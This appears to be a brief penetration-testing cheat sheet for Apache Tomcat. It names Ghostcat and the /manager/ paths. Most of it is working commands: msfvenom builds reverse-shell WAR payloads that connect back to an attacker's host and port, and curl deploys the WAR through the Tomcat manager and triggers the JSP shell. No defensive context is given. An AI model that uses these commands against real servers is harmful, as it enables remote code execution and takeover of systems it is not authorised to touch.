

[Ghostcat]()
/manager/
/manager-gui/
Upload should not necessarily require username and password
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f war -o shell.war
# OR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f war -o shell.war
# the FILE.jsp is catable in the .war shell 
curl -u '[USERNAME]:[PASSWORD]' --upload-file shell.war "http://$IP:8080/mana ger/text/deploy?path=/shell"
# Check the file
curl -u '[USERNAME]:[PASSWORD]' "http://$IP:8080/shell/$FILE.jsp
```